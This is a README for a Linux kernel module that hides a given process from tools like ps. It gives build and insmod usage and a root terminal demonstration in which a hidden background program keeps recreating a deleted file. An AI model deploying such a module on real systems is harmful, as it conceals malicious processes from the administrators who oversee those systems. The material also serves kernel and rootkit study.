# hideproc-lkm
Linux 4.9 Loadable Kernel Module to hide processes from system utilities

### Usage
```
$ make
$ insmod hideproc.ko target_pid=[PID] [verb=1]
```

### Proof of Concept

```
root @ debtest ~/hideproc-lkm # ./putfile&
[1] 1942

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:24 /tmp/test-put

root @ debtest ~/hideproc-lkm # rm /tmp/test-put

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:24 /tmp/test-put

root @ debtest ~/hideproc-lkm # ps aux | grep putfile
root      1942  0.0  0.0   4172   640 pts/0    SN   22:24   0:00 ./putfile
root      1949  0.0  0.0  12784   964 pts/0    S+   22:25   0:00 grep --color=auto putfile

root @ debtest ~/hideproc-lkm # dmesg -C

root @ debtest ~/hideproc-lkm # insmod hideproc.ko verb=1 target_pid=1942

root @ debtest ~/hideproc-lkm # rmmod hideproc

root @ debtest ~/hideproc-lkm # dmesg -c
[   49.827077] hideproc: loading out-of-tree module taints kernel.
[   49.828424] Target PID is 1942
[   49.828434] Process id is 1942
[   49.828435] Next process is make
[   49.828435] Prev process is zsh
[   49.843229] Number of elements to remove: 2
[   49.844567] Goodbye, World!

root @ debtest ~/hideproc-lkm # ps aux | grep putfile

root @ debtest ~/hideproc-lkm [1] # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:26 /tmp/test-put

root @ debtest ~/hideproc-lkm # rm /tmp/test-put

root @ debtest ~/hideproc-lkm # ls -l /tmp/test-put
-rw-r--r-- 1 root root 4 Aug 24 22:26 /tmp/test-put
```
